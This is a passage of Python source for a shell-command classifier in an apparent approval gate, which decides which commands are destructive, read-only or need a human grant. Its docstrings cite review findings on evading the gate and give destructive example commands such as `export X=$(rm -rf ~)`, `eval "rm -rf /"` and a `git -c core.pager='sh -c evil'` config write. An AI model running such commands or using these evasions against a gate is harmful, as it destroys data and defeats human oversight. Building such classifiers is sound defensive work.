    it is exactly the delimiter — indented or quoted look-alikes inside the text do not, and
    an unterminated heredoc swallows the rest of the input.
    """
    lines = command.split("\n")
    kept: list[str] = []
    index = 0
    while index < len(lines):
        line, delimiters = _take_heredoc_operators(lines[index])
        kept.append(line)
        index += 1
        for delimiter, dash in delimiters:
            while index < len(lines):
                body = lines[index]
                index += 1
                candidate = body.strip() if dash else body.rstrip()
                if candidate == delimiter:
                    break
    return "\n".join(kept)


def _take_heredoc_operators(line: str) -> tuple[str, list[tuple[str, bool]]]:
    """Strip ``<<WORD`` / ``<<-WORD`` / ``<<'WORD'`` from one line, returning the delimiters.

    Three shapes carry a ``<<`` that does NOT open a heredoc and must be stepped over whole,
    or the scan invents a delimiter and eats the rest of the command as its body (finding R1):
    the here-string :data:`HERE_STRING_OPERATOR`, the arithmetic left shift inside
    :data:`ARITHMETIC_OPENERS`, and a quoted literal ``<<`` (handled by the quote state below).
    """
    out: list[str] = []
    delimiters: list[tuple[str, bool]] = []
    index = 0
    quote: str | None = None
    while index < len(line):
        char = line[index]
        if quote:
            out.append(char)
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(line):
            out.append(line[index : index + 2])
            index += 2
            continue
        if char in "'\"`":
            quote = char
            out.append(char)
            index += 1
            continue
        opener = next((o for o in ARITHMETIC_OPENERS if line.startswith(o, index)), None)
        if opener is not None:
            end = _matching(line, index + len(opener) - 2)
            out.append(line[index : end + 1])
            index = end + 1
            continue
        if line.startswith(HERE_STRING_OPERATOR, index):
            index += len(HERE_STRING_OPERATOR)
            out.append(HERE_STRING_OPERATOR)
            while index < len(line) and line[index] in " \t":
                out.append(line[index])
                index += 1
            word, index = _read_word(line, index)
            out.append(word)
            continue
        if line[index : index + 2] == "<<":
            index += 2
            dash = line[index : index + 1] == "-"
            if dash:
                index += 1
            while index < len(line) and line[index] in " \t":
                index += 1
            word, index = _read_word(line, index)
            if word:
                delimiters.append((_unquote(word), dash))
                out.append(" ")
                continue
            out.append("<<")
            continue
        out.append(char)
        index += 1
    return "".join(out), delimiters


# --------------------------------------------------------------------------- step 3

class _Raw:
    """One top-level command as the splitter found it, plus whether a pipe fed it."""

    __slots__ = ("text", "piped")

    def __init__(self, text: str, piped: bool) -> None:
        self.text = text
        self.piped = piped


def _split_top_level(text: str) -> list[_Raw]:
    """PRD §3.2 step 3: split at top-level ``&&``, ``||``, ``;``, ``|``, ``&`` and newline.

    Quotes, backslash escapes and backticks suspend splitting (``echo "a; b"`` is one
    command), and ``( )`` / ``{ }`` groups are kept whole for the caller to recurse into.
    """
    parts: list[_Raw] = []
    buffer: list[str] = []
    piped = False
    depth = 0
    index = 0
    quote: str | None = None

    def flush(next_piped: bool) -> None:
        nonlocal piped, buffer
        parts.append(_Raw("".join(buffer), piped))
        buffer = []
        piped = next_piped

    while index < len(text):
        char = text[index]
        if quote:
            buffer.append(char)
            if char == "\\" and quote == '"' and index + 1 < len(text):
                buffer.append(text[index + 1])
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            buffer.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"`":
            quote = char
            buffer.append(char)
            index += 1
            continue
        if char in "({":
            depth += 1
            buffer.append(char)
            index += 1
            continue
        if char in ")}":
            depth = max(0, depth - 1)
            buffer.append(char)
            index += 1
            continue
        if depth == 0:
            pair = text[index : index + 2]
            if char in "<>" or (char == "&" and text[index + 1 : index + 2] == ">"):
                # A redirection operator, fd duplication included: the `&` of `2>&1` or
                # `&> log` belongs to the operator, not to the `&` separator. Splitting
                # there invented a phantom `1` command and an empty write target.
                buffer.append(char)
                index += 1
                while index < len(text) and text[index] in REDIRECTION_OPERATOR_CHARS:
                    buffer.append(text[index])
                    index += 1
                continue
            if pair in ("&&", "||"):
                flush(False)
                index += 2
                continue
            if char == "|":
                flush(True)
                index += 1 + (1 if pair == "|&" else 0)
                continue
            if char in ";\n&":
                flush(False)
                index += 1
                continue
        buffer.append(char)
        index += 1
    flush(False)
    return parts


def _function_body(text: str) -> str | None:
    """The body of a shell function definition, or None if this is not one.

    See :data:`FUNCTION_DEFINITION_RE`. The body has to be a real `{ … }` / `( … )` group, so a
    half-written definition falls back to ordinary classification rather than silently vanishing.
    """
    match = FUNCTION_DEFINITION_RE.match(text)
    if match is None:
        return None
    return _group_inner(match.group("body").strip())


def _group_inner(body: str) -> str | None:
    """Return the inside of a ``( … )`` or ``{ … }`` group, or None if this is not one."""
    if body.startswith("(") and body.endswith(")"):
        return body[1:-1]
    if body.startswith("{") and body.endswith("}") and body[1:2] in (" ", "\t", "\n"):
        return body[1:-1]
    return None


def _classify_text(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[list[ShellSegment], list[str]]:
    """Steps 2-8 over a already-heredoc-stripped string; recursive for groups and payloads.

    ``cwd`` carries the directory a leading ``cd`` moved the shell to (finding R2a); a fresh one
    means "wherever the command started".
    """
    segments: list[ShellSegment] = []
    dropped: list[str] = []
    previous_head: str | None = None
    cwd = _Cwd() if cwd is None else cwd
    for raw in _split_top_level(text):
        body = raw.text.strip()
        if not body:
            previous_head = None
            continue
        inner = _group_inner(body)
        subshell = inner is not None and body.startswith("(")
        if inner is None:
            inner = _function_body(body)
            subshell = True  # a definition's `cd` runs when the function is CALLED, not here
        if inner is not None:
            group_segments, group_dropped = _classify_text(
                inner, settings, cwd.copy() if subshell else cwd
            )
            segments.extend(group_segments)
            dropped.extend(group_dropped)
            previous_head = None
            continue
        residual, lifted = _lift_substitutions(body, settings, cwd)
        segments.extend(lifted)
        host, extras, host_dropped, head = _classify_one(residual, settings, cwd)
        dropped.extend(host_dropped)
        if host is not None:
            if (
                raw.piped
                and previous_head in settings.pipe_to_shell_sources
                and head in settings.pipe_to_shell_sinks
            ):
                host = replace(host, destructive=True, read_only=False)
            segments.append(host)
        segments.extend(extras)
        previous_head = head
    return segments, dropped


# --------------------------------------------------------------------------- step 2

def _lift_substitutions(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[str, list[ShellSegment]]:
    """PRD §3.2 step 2: lift ``$(…)``, backticks, ``<(…)`` and ``>(…)`` into their own segments.

    Recursive, and done *before* the drop rule of step 6, so ``export X=$(rm -rf ~)`` is
    classified by its inner command even though the ``export`` shell is dropped
    (critic finding 3). Single quotes suspend substitution; double quotes do not.
    """
    out: list[str] = []
    lifted: list[ShellSegment] = []
    index = 0
    in_double = False

    def recurse(inner: str) -> None:
        # A substitution runs in a subshell: it inherits the directory and cannot change ours.
        inner_segments, _ = _classify_text(inner, settings, (cwd or _Cwd()).copy())
        lifted.extend(inner_segments)

    while index < len(text):
        char = text[index]
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char == "'" and not in_double:
            end = text.find("'", index + 1)
            end = len(text) - 1 if end == -1 else end
            out.append(text[index : end + 1])
            index = end + 1
            continue
        if char == '"':
            in_double = not in_double
            out.append(char)
            index += 1
            continue
        if text[index : index + 3] == "$((":
            end = _matching(text, index + 2)
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1 if text[end : end + 1] == ")" else end
            if text[index : index + 1] == ")":
                index += 1
            continue
        if char == "$" and text[index + 1 : index + 2] == "(":
            end = _matching(text, index + 1)
            recurse(text[index + 2 : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char == "`":
            end = text.find("`", index + 1)
            end = len(text) if end == -1 else end
            recurse(text[index + 1 : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char in "<>" and not in_double and text[index + 1 : index + 2] == "(":
            end = _matching(text, index + 1)
            recurse(text[index + 2 : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        out.append(char)
        index += 1
    return "".join(out), lifted


def _matching(text: str, open_index: int) -> int:
    """Index of the ``)`` closing the ``(`` at ``open_index``; end of string if unbalanced."""
    depth = 0
    index = open_index
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            if char == "\\" and quote == '"' and index + 1 < len(text):
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\":
            index += 2
            continue
        if char in "'\"":
            quote = char
            index += 1
            continue
        if char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
            if depth == 0:
                return index
        index += 1
    return len(text)


# --------------------------------------------------------------------------- steps 4-8

def _classify_one(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[ShellSegment | None, list[ShellSegment], list[str], str | None]:
    """One command: redirections, drop rule, wrapper peel, payload lift, signature, targets.

    Returns ``(host segment or None if dropped, lifted payload segments, dropped texts,
    head token)``. PRD §3.2 steps 4-8. A ``cd`` here moves ``cwd`` for the segments after it.
    """
    cwd = _Cwd() if cwd is None else cwd
    command_text, redirect_targets = _extract_redirections(text)
    argv = _strip_prefixes(_tokenize(command_text))
    if argv:
        argv = [_basename(argv[0]), *argv[1:]]
    if not argv:
        if not redirect_targets:
            return None, [], [text.strip()] if text.strip() else [], None
        return (
            _make_segment(REDIRECT_ONLY_SIGNATURE, (), settings, redirect_targets, cwd=cwd),
            [], [], None,
        )

    # The directory moves whether or not the segment is dropped (finding R2a).
    if argv[0] in DIRECTORY_CHANGE_COMMANDS:
        _apply_cd(cwd, argv)
    elif argv[0] in DIRECTORY_RESTORE_COMMANDS:
        cwd.unresolvable = True

    # Step 6 — drop only the exact no-op segments; after step 2 no substitution survives here.
    if argv[0] in settings.dropped_commands and not redirect_targets:
        return None, [], [text.strip()], argv[0]

    argv = _peel(argv, settings)
    if not argv:
        return None, [], [text.strip()], None
    return _build(argv, settings, redirect_targets, cwd)


def _strip_prefixes(argv: list[str]) -> list[str]:
    """Drop the leading tokens that are not the command: keywords and ``K=V`` assignments.

    ``A=1 rm -rf x`` is a plain shell assignment prefix — the same evasion ``env A=1 rm -rf x``
    uses, without the ``env`` (PRD §3.2 step 4). See :data:`SHELL_KEYWORDS`.
    """
    index = 0
    while index < len(argv) and (argv[index] in SHELL_KEYWORDS or ASSIGNMENT_RE.match(argv[index])):
        index += 1
    return argv[index:]


def _basename(token: str) -> str:
    """Command name without its directory (see :data:`PATH_SEPARATORS`)."""
    for separator in PATH_SEPARATORS:
        token = token.rsplit(separator, 1)[-1]
    return token


def _build(
    argv: list[str], settings: GateSettings, redirect_targets: list[str], cwd: _Cwd | None = None
) -> tuple[ShellSegment | None, list[ShellSegment], list[str], str | None]:
    """Signature + payload lifting for a peeled argv (PRD §3.2 steps 5, 7, 8)."""
    argv = [_basename(argv[0]), *argv[1:]]
    head = argv[0]
    extras: list[ShellSegment] = []
    cwd = _Cwd() if cwd is None else cwd

    runner = _composing_runner(argv, settings)
    if runner is not None:
        prefix, inner_argv = runner
        host, inner_extras, _, _ = _build(inner_argv, settings, redirect_targets, cwd)
        if host is None:  # pragma: no cover - inner argv is non-empty by construction
            host = _make_segment(prefix, tuple(argv), settings, redirect_targets, cwd=cwd)
        else:
            host = replace(
                host,
                signature=f"{prefix} {host.signature}",
                argv=tuple(argv),
                read_only=False,
            )
        return host, inner_extras, [], head

    payload_argvs: list[list[str]] = []
    payload_texts: list[str] = []
    find_delete = False
    if head in settings.payload_commands:
        if head == FIND_COMMAND:
            payload_argvs, find_delete = _find_payloads(argv)
        else:
            payload = _command_payload(argv)
            if payload:
                payload_argvs.append(payload)

    signature, inline = _signature(argv, settings, find_delete=find_delete)
    force_destructive = False
    force_read_only = False
    if signature == GIT_CONFIG_SIGNATURE:
        signature, force_destructive, force_read_only = _git_config_facts(argv, settings)
    if head == "git":
        extras.extend(_git_inline_config_segments(argv, settings))

    if _is_shell_interpreter(head, settings):
        payload_texts = _inline_payloads(argv, settings)
    elif head in settings.inline_by_nature:
        payload_texts = _inline_by_nature_payload(argv)

    if head in WRAPPER_INLINE_COMMAND_FLAGS:
        payload_texts = _flag_values(list(argv[1:]), WRAPPER_INLINE_COMMAND_FLAGS[head])
        inline = inline or bool(payload_texts)

    remote = _remote_command(argv)
    if remote is not None:
        tokens, shell_joined = remote
        if tokens and shell_joined:
            payload_texts = [*payload_texts, " ".join(tokens)]
        elif tokens:
            payload_argvs = [*payload_argvs, tokens]
        inline = True

    for payload in payload_argvs:
        segment, more, _, _ = _build(payload, settings, [], cwd)
        if segment is not None:
            extras.append(segment)
        extras.extend(more)
    for payload_text in payload_texts:
        inner_segments, _ = _classify_text(payload_text, settings, cwd.copy())
        extras.extend(inner_segments)

    host = _make_segment(
        signature,
        tuple(argv),
        settings,
        redirect_targets,
        cwd=cwd,
        inline=inline,
        payload_lifted=bool(payload_argvs or payload_texts),
        force_destructive=force_destructive,
        force_read_only=force_read_only,
    )
    return host, extras, [], head


def _make_segment(
    signature: str,
    argv: tuple[str, ...],
    settings: GateSettings,
    redirect_targets: list[str],
    *,
    cwd: _Cwd | None = None,
    inline: bool = False,
    payload_lifted: bool = False,
    force_destructive: bool = False,
    force_read_only: bool = False,
) -> ShellSegment:
    """Assemble the segment: destructive/read-only verdict plus step 8's write targets.

    ``force_destructive`` / ``force_read_only`` are for facts that cannot be read off a signature
    set because the signature is built from the command's own arguments — ``git config
    core.hooksPath`` is destructive and ``git config --get x`` is read-only, and neither key can be
    enumerated in advance.
    """
    written = list(redirect_targets) + _write_targets(signature, argv, settings)
    resolved = [_resolve_target(cwd or _Cwd(), target) for target in written]
    targets = [target for target, _ in resolved]
    # A BARE command name in the destructive set condemns every spelling of it: `docker` is
    # there, so `docker exec …` and `docker run …` are destructive too (finding R9 — the
    # subcommand key made them merely unfamiliar, and therefore grantable). A flagged entry like
    # `rm -rf` says nothing about plain `rm`, which is the point of critic finding 12.
    destructive = (
        force_destructive
        or signature in settings.destructive_signatures
        or signature.split(" ", 1)[0] in settings.destructive_signatures
    )
    read_only = (
        (force_read_only or signature in settings.read_only_signatures)
        and not destructive
        and not payload_lifted
    )
    return ShellSegment(
        signature=signature,
        argv=argv,
        read_only=read_only,
        destructive=destructive,
        inline_interpreter=inline,
        write_targets=tuple(targets),
        unresolvable_write=any(unresolvable for _, unresolvable in resolved) or any(
            any(bad in target for bad in UNRESOLVABLE_TARGET_CHARS) for target in targets
        ),
    )


def _peel(argv: list[str], settings: GateSettings) -> list[str]:
    """PRD §3.2 step 4: peel wrappers down to the command they wrap.

    ``sudo`` is deliberately absent from ``wrapper_commands``: it keeps its own signature and
    is destructive before any peeling.
    """
    while len(argv) > 1 and argv[0] in settings.wrapper_commands:
        head, rest = argv[0], argv[1:]
        value_flags = WRAPPER_HEAD_VALUE_FLAGS.get(head, WRAPPER_VALUE_FLAGS)
        skips = WRAPPER_POSITIONAL_SKIPS.get(head, 0)
        index = 0
        while index < len(rest):
            token = rest[index]
            if ASSIGNMENT_RE.match(token):
                index += 1
                continue
            if token.startswith("-") and token != "-":
                index += 2 if token in value_flags else 1
                continue
            if head in WRAPPER_NUMERIC_ARG and DURATION_RE.match(token):
                index += 1
                continue
            if skips:
                skips -= 1
                index += 1
                continue
            break
        required = WRAPPER_SUBCOMMANDS.get(head)
        if required is not None:
            if index >= len(rest) or rest[index] not in required:
                return argv
            index += 1
        if index >= len(rest):
            return argv
        argv = rest[index:]
    return argv


def _composing_runner(
    argv: list[str], settings: GateSettings
) -> tuple[str, list[str]] | None:
    """``uv run CMD …`` → (``"uv run"``, CMD argv). See :data:`COMPOSING_RUNNERS`."""
    for runner in COMPOSING_RUNNERS:
        prefix = runner.split()
        if argv[: len(prefix)] != prefix:
            continue
        index = len(prefix)
        while index < len(argv):
            token = argv[index]
            if token.startswith("-"):
                index += 2 if token in UV_RUN_VALUE_FLAGS else 1
                continue
            break
        if index < len(argv) and argv[index] not in settings.dropped_commands:
            return runner, argv[index:]
    return None


def _find_payloads(argv: list[str]) -> tuple[list[list[str]], bool]:
    """PRD §3.2 step 5: ``find -exec/-execdir/-ok CMD … ;|+`` payloads, and ``-delete``."""
    payloads: list[list[str]] = []
    delete = False
    index = 1
    while index < len(argv):
        token = argv[index]
        if token == "-delete":
            delete = True
            index += 1
            continue
        if token in FIND_PAYLOAD_PRIMARIES:
            index += 1
            payload: list[str] = []
            while index < len(argv) and argv[index] not in FIND_PAYLOAD_TERMINATORS:
                payload.append(argv[index])
                index += 1
            index += 1
            if payload:
                payloads.append(payload)
            continue
        index += 1
    return payloads, delete


def _remote_command(argv: list[str]) -> tuple[list[str], bool] | None:
    """The command ``ssh``/``docker exec`` will run elsewhere — (tokens, the remote side is a
    shell) — or None if this is neither.

    The token list is empty for a remote shell with no command (``ssh host``): still code under
    this key, just none of it visible here. See :data:`REMOTE_EXEC_COMMANDS` (finding R9).
    """
    entry = REMOTE_EXEC_COMMANDS.get(argv[0])
    if entry is None:
        return None
    prefix, value_flags, shell_joined = entry
    rest = argv[1:]
    if prefix:
        if tuple(rest[: len(prefix)]) != prefix:
            return None
        rest = rest[len(prefix):]
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        break
    return (rest[index + 1:] if index < len(rest) else []), shell_joined


def _command_payload(argv: list[str]) -> list[str]:
    """PRD §3.2 step 5: the command a payload runner will run — its first non-option token onward.

    The rule for every member of ``settings.payload_commands`` except ``find`` (whose payload sits
    behind a primary). Options and their values are skipped per :data:`PAYLOAD_VALUE_FLAGS`, and
    the argument list GNU parallel appends after :data:`PAYLOAD_ARGUMENT_SEPARATORS` is data, not
    part of the command. Empty when the runner falls back to its default (``xargs`` → ``echo``).

    Generic on purpose (finding R9b): adding ``parallel`` to ``payload_commands`` in config has to
    be enough to lift ``parallel rm -rf {} ::: a b``, with no code change here.
    """
    value_flags = PAYLOAD_VALUE_FLAGS.get(argv[0], frozenset())
    index = 1
    while index < len(argv):
        token = argv[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        break
    payload = argv[index:]
    for separator in PAYLOAD_ARGUMENT_SEPARATORS:
        if separator in payload:
            payload = payload[: payload.index(separator)]
    return payload


def _inline_payloads(argv: list[str], settings: GateSettings) -> list[str]:
    """PRD §3.2 step 5: the string after ``sh -c`` / ``bash -c`` / ``zsh -c``, to recurse into."""
    flags = settings.inline_code_flags.get(argv[0], ())
    fold = argv[0] in CASE_FOLDED_FLAG_INTERPRETERS
    payloads: list[str] = []
    for index, token in enumerate(argv[1:], start=1):
        if _inline_flag(token, flags, fold=fold) and index + 1 < len(argv):
            payloads.append(argv[index + 1])
    return payloads


def _inline_by_nature_payload(argv: list[str]) -> list[str]:
    """``eval ARGS`` → the shell text it will run (critic finding F4).

    ``eval`` takes its code as plain arguments and joins them with a space before running them,
    exactly as ``bash -c`` runs its one string — so the arguments are joined and recursed into by
    the same path. ``eval "rm -rf /"`` is an `rm -rf` segment plus the `eval`; an argument that is
    only a variable (``eval $CMD``) recurses to an unfamiliar segment, which is what ``bash -c
    "$CMD"`` already does, because neither one can be resolved without running it.
    """
    text = " ".join(argv[1:]).strip()
    return [text] if text else []


def _inline_flag(token: str, flags: tuple[str, ...], *, fold: bool = False) -> str | None:
    """The inline-code flag this token carries, or None.

    Short flags cluster: ``bash -lc "rm -rf x"`` is ``bash -c`` with a login shell, and reading
    only exact matches would file it as ``bash <script>`` and never recurse into the payload.

    ``fold`` switches to the Windows shells' own matching — case-insensitive, any unambiguous
    prefix, canonical spelling returned (:data:`CASE_FOLDED_FLAG_INTERPRETERS`).
    """
    if token in flags:
        return token
    if fold:
        lowered = token.lower()
        if len(token) < 2:
            return None
        return next((flag for flag in flags if flag.lower().startswith(lowered)), None)
    if token.startswith("-") and not token.startswith("--"):
        for flag in flags:
            if len(flag) == 2 and flag[1] in token[1:]:
                return flag
    return None


def _signature(
    argv: list[str], settings: GateSettings, *, find_delete: bool = False
) -> tuple[str, bool]:
    """PRD §3.2 step 7: the grant key for a peeled command, and whether it runs inline code.

    First token, plus the subcommand for ``settings.subcommand_tools``, plus the interpreter
    mode for ``settings.interpreter_commands``, plus the canonical destructive flags for
    ``settings.destructive_flag_verbs``.
    """
    head = argv[0]
    rest = argv[1:]

    if find_delete:
        return FIND_DELETE_SIGNATURE, False

    base = head
    if head in settings.subcommand_tools:
        found = _first_subcommand(head, rest)
        if found:
            subcommand, after = found
            base = f"{head} {subcommand}"
            if subcommand in NESTED_SUBCOMMAND_GROUPS.get(head, frozenset()):
                nested = _first_subcommand(head, after)
                if nested:
                    base = f"{base} {nested[0]}"
            else:
                operation = _operation_word(base, after)
                if operation:
                    base = f"{base} {operation}"

    if head == "sed":
        for canonical, spellings in SED_MODE_FLAGS:
            if any(
                _matches_flag(token, spellings, SED_ATTACHED_VALUE_LETTERS) for token in rest
            ):
                return f"sed {canonical}", False

    if head in settings.source_commands:
        # `source FILE` / `. FILE` runs the file's contents in THIS shell. Nothing on the command
        # line says what that is, so it is an inline interpreter keyed like `python3 <script>`
        # (critic finding F3b). The file is not read here — the classifier is pure.
        target = next((token for token in rest if not token.startswith("-")), None)
        signature = f"{SOURCE_SIGNATURE} {SCRIPT_PLACEHOLDER}" if target else SOURCE_SIGNATURE
        return signature, True

    if head in settings.inline_by_nature:
        return base, True

    if head in settings.interpreter_commands or base in settings.interpreter_commands:
        key = base if base in settings.interpreter_commands else head
        mode, inline = _interpreter_mode(key, rest, settings)
        if mode:
            return f"{key} {mode}", inline
        return key, False

    verb, _ = _destructive_verb(base, settings)
    flags = _destructive_flags(base, rest, settings)
    return verb + flags, False


def _interpreter_mode(
    key: str, rest: list[str], settings: GateSettings
) -> tuple[str, bool]:
    """``-c`` (inline), ``-m MOD``, ``<script>`` or nothing — the four keys of critic finding 5."""
    inline_flags = settings.inline_code_flags.get(key, ())
    if key in CASE_FOLDED_FLAG_INTERPRETERS:
        # The inline flag can sit behind an option that takes a value, and need not start with a
        # dash at all (`cmd /c`), so it is looked for everywhere before the positional rule.
        found = next(
            (flag for flag in (_inline_flag(token, inline_flags, fold=True) for token in rest)
             if flag),
            None,
        )
        if found:
            return found, True
    index = 0
    while index < len(rest):
        token = rest[index]
        flag = _inline_flag(token, inline_flags)
        if flag:
            return flag, True
        if token == "-m" and index + 1 < len(rest):
            return f"-m {rest[index + 1]}", False
        if not token.startswith("-"):
            return SCRIPT_PLACEHOLDER, False
        index += 1
    return "", False


def _git_config_facts(argv: list[str], settings: GateSettings) -> tuple[str, bool, bool]:
    """``git config …`` → (signature, destructive, read_only) — critic finding F3(a).

    A WRITE to a key in ``settings.git_config_dangerous_keys`` repoints what git will execute on
    some later command, so it is destructive and therefore ungrantable: the signature carries the
    key (``git config core.hooksPath``) because that is the thing the human is being asked about.
    Any other write keeps the plain ``git config`` key and stays grantable; a read
    (``--get``, ``--list``, ``-l``, ``git config KEY`` with no value) is read-only and never asks.
    """
    try:
        tokens = argv[argv.index("config") + 1:]
    except ValueError:  # pragma: no cover - only reached with the "git config" signature
        return GIT_CONFIG_SIGNATURE, False, False

    write = False
    key: str | None = None
    index = 0
    while index < len(tokens):
        token = tokens[index]
        name = token.split("=", 1)[0]
        if name in GIT_CONFIG_VALUE_FLAGS:
            index += 1 if "=" in token else 2
            continue
        if token.startswith("-"):
            write = write or name in GIT_CONFIG_WRITE_FLAGS
            index += 1
            continue
        if key is None and token in GIT_CONFIG_WRITE_SUBCOMMANDS:
            write = True
        elif key is None and token in GIT_CONFIG_READ_SUBCOMMANDS:
            pass
        elif key is None:
            key = token
        else:
            # A second positional is the VALUE the key is being set to.
            write = True
        index += 1

    if write and key and _is_dangerous_git_key(key, settings):
        return f"{GIT_CONFIG_SIGNATURE} {key}", True, False
    return GIT_CONFIG_SIGNATURE, False, not write


def _git_inline_config_segments(
    argv: list[str], settings: GateSettings
) -> list[ShellSegment]:
    """``git -c key=value CMD`` / ``git --config-env=key=VAR CMD`` (:data:`GIT_INLINE_CONFIG_FLAG`).

    A dangerous key becomes its own destructive segment so the host command keeps its own
    signature: ``git -c core.pager='sh -c evil' log`` is still a ``git log``, and it is also a
    config write that nobody would see if the two facts were merged.
    """
    keys: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        if token == GIT_INLINE_CONFIG_FLAG and index + 1 < len(argv):
            keys.append(argv[index + 1].split("=", 1)[0])
            index += 2
            continue
        if token.startswith(f"{GIT_INLINE_CONFIG_ENV_FLAG}="):
            keys.append(token.split("=", 1)[1].split("=", 1)[0])
            index += 1
            continue
        if token == GIT_INLINE_CONFIG_ENV_FLAG and index + 1 < len(argv):
            keys.append(argv[index + 1].split("=", 1)[0])
            index += 2
            continue
        index += 1
    return [
        _make_segment(
            f"{GIT_CONFIG_SIGNATURE} {key}",
            ("git", "config", key),
            settings,
            [],
            force_destructive=True,
        )
        for key in keys
        if _is_dangerous_git_key(key, settings)
    ]


def _is_dangerous_git_key(key: str, settings: GateSettings) -> bool:
    """Match one config key against ``settings.git_config_dangerous_keys``.

    ``*`` globs the rest of the key (``url.*.insteadOf`` covers ``url.https://x/.insteadOf``, dots
    and slashes included) and the comparison is case-insensitive, as git treats section and
    variable names.
    """
    lowered = key.lower()
    return any(
        fnmatch.fnmatchcase(lowered, pattern.lower())
        for pattern in settings.git_config_dangerous_keys
    )


def _first_subcommand(head: str, rest: list[str]) -> tuple[str, list[str]] | None:
    """First positional argument and what follows it, skipping global flags and their values.

    The tail is what lets a group take one more word (:data:`NESTED_SUBCOMMAND_GROUPS`); PRD
    §3.2 step 7.
    """
    value_flags = SUBCOMMAND_VALUE_FLAGS.get(head, frozenset())
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-"):
            index += 2 if token in value_flags else 1
            continue
        return token, rest[index + 1:]
    return None


def _operation_word(base: str, after: list[str]) -> str:
    """The operation this two-word signature is missing, or ``""`` (:data:`SUBCOMMAND_OPERATION_WORDS`).

    ``after`` is everything past the subcommand. Table order decides, not command-line order, so
    the destructive reading wins when a command carries two spellings.
    """
    for canonical, spellings in SUBCOMMAND_OPERATION_WORDS.get(base, ()):
        if any(_matches_flag(token, spellings) for token in after):
            return canonical
    return ""


def _destructive_verb(base: str, settings: GateSettings) -> tuple[str, tuple[str, ...]]:
    """The ``destructive_flag_verbs`` entry for this command — (canonical verb, its flags).

    The verb is returned because it may be spelled differently from ``base``: PowerShell and cmd
    are case-insensitive about command names as well as flags, so ``remove-item -recurse -force x``
    is ``Remove-Item -Recurse -Force`` and has to reach the same key (v0.14 critic A4). Folding is
    limited to the entries whose flags carry their own lead character (:data:`SPELLED_FLAG_LEADERS`)
    — the POSIX verbs stay case-sensitive, where ``R`` and ``r`` are different flags and ``RM`` is
    not ``rm``.
    """
    canonical = settings.destructive_flag_verbs.get(base)
    if canonical is not None:
        return base, canonical
    lowered = base.lower()
    for verb, flags in settings.destructive_flag_verbs.items():
        if verb.lower() == lowered and _is_spelled_flag_verb(flags):
            return verb, flags
    return base, ()


def _is_spelled_flag_verb(canonical: tuple[str, ...]) -> bool:
    """Does this entry spell its flags in full, lead character included? :data:`SPELLED_FLAG_LEADERS`"""
    return bool(canonical) and all(flag[:1] in SPELLED_FLAG_LEADERS for flag in canonical)


def _spelled_flags(canonical: tuple[str, ...], rest: list[str]) -> str:
    """Windows flag suffix: the flags found, in the verb's own order, spelled as the table spells
    them (``Remove-Item -Recurse -Force``).

    A dash flag matches case-insensitively by PREFIX, because PowerShell accepts any unambiguous
    abbreviation (``-r``, ``-rec``, ``-Recurse``); a slash flag matches folded but whole, because
    cmd's do not abbreviate. A bare ``-`` matches nothing.
    """
    found = [
        flag for flag in canonical
        if any(_matches_spelled_flag(token, flag) for token in rest)
    ]
    return "".join(f" {flag}" for flag in found)


def _matches_spelled_flag(token: str, flag: str) -> bool:
    """One token against one fully-spelled Windows flag (see :func:`_spelled_flags`)."""
    if flag.startswith("-"):
        return len(token) > 1 and flag.lower().startswith(token.lower())
    return token.lower() == flag.lower()


def _destructive_flags(base: str, rest: list[str], settings: GateSettings) -> str:
    """Canonical flag suffix for a verb in ``settings.destructive_flag_verbs``, else ``""``."""
    _, canonical = _destructive_verb(base, settings)
    if not canonical:
        return ""
    if _is_spelled_flag_verb(canonical):
        return _spelled_flags(canonical, rest)
    found: set[str] = set()
    for token in rest:
        if not token.startswith("-") or token == "-":
            continue
        if token.startswith("--"):
            atoms = [token[2:].split("=", 1)[0]]
        else:
            atoms = list(token[1:])
        for atom in atoms:
            for candidate in FLAG_ALIASES.get(atom, (atom,)):
                if candidate in canonical:
                    found.add(candidate)
                    break
    shorts = [flag for flag in canonical if flag in found and len(flag) == 1]
    longs = [flag for flag in canonical if flag in found and len(flag) > 1]
    suffix = f" -{''.join(shorts)}" if shorts else ""
    return suffix + "".join(f" --{flag}" for flag in longs)


def _matches_flag(token: str, spellings: tuple[str, ...], attached_value_letters: str = "") -> bool:
    """Does this token carry one of these flags — exact, long-with-value, or inside a cluster?

    Short options cluster, so ``sed -Ei`` is ``sed -i`` with extended regexes. The old test was
    ``token.startswith("-i")``, which saw only the cluster's FIRST letter: ``-Ei``, ``-ni`` and
    ``-ri`` all signed as a plain read ``sed`` with no write target (finding R7).

    ``attached_value_letters`` are the letters whose argument may be attached (sed's ``-e``,
    ``-f``, ``-l``): everything after one of them is that argument, not more flags, so
    ``sed -e's/i/x/'`` is not an in-place edit. A flag's own attached suffix is still its own —
    ``-i.bak`` is ``-i`` (sed(1)).
    """
    for spelling in spellings:
        if token == spelling or token.startswith(f"{spelling}="):
            return True
        if len(spelling) != 2 or not spelling.startswith("-"):
            continue
        if not token.startswith("-") or token.startswith("--"):
            continue
        for letter in token[1:]:
            if letter == spelling[1]:
                return True
            if letter in attached_value_letters:
                break
    return False


# --------------------------------------------------------------------------- step 8

def _write_targets(signature: str, argv: tuple[str, ...], settings: GateSettings) -> list[str]:
